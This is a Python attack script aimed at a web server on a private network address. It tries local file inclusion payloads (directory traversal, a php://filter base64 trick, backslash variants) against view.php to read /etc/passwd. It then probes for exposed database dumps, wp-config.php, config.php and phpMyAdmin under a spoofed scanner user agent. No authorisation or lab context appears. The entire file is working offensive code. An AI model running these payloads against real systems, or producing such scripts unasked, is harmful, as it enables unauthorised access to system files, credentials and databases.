import urllib.request, socket
socket.setdefaulttimeout(10)
base = "http://192.168.18.132"

# Test LFI on view.php
print("=== LFI Test on view.php ===")
lfi_payloads = [
    "page=../../../etc/passwd",
    "page=....//....//....//etc/passwd",
    "page=php://filter/convert.base64-encode/resource=/etc/passwd",
    "page=/etc/passwd",
    "page=....\\....\\....\\etc\\passwd",
]

for payload in lfi_payloads:
    try:
        url = base + "/view.php?" + payload
        req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read(2000).decode("utf-8", errors="ignore")
        if "root:" in content or "www-data" in content:
            print(f"  [LFI FOUND] {payload}")
            print(f"    Content: {content[:200]}")
        elif len(content) > 100:
            print(f"  {payload[:40]} -> {len(content)} bytes")
    except Exception as e:
        print(f"  {payload[:40]} -> Error: {str(e)[:50]}")

# More endpoints
print("\n=== More Endpoints ===")
more = ["/view.php", "/rr.php", "/db.sql", "/db.sql.gz", "/wp-config.php",
        "/config.php", "/backup.sql", "/admin", "/phpmyadmin"]

for p in more:
    try:
        req = urllib.request.Request(base + p, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read(500)
        print(f"  {p} -> 200, {len(content)} bytes")
    except urllib.error.HTTPError as e:
        print(f"  {p} -> {e.code}")
    except Exception as e:
        pass
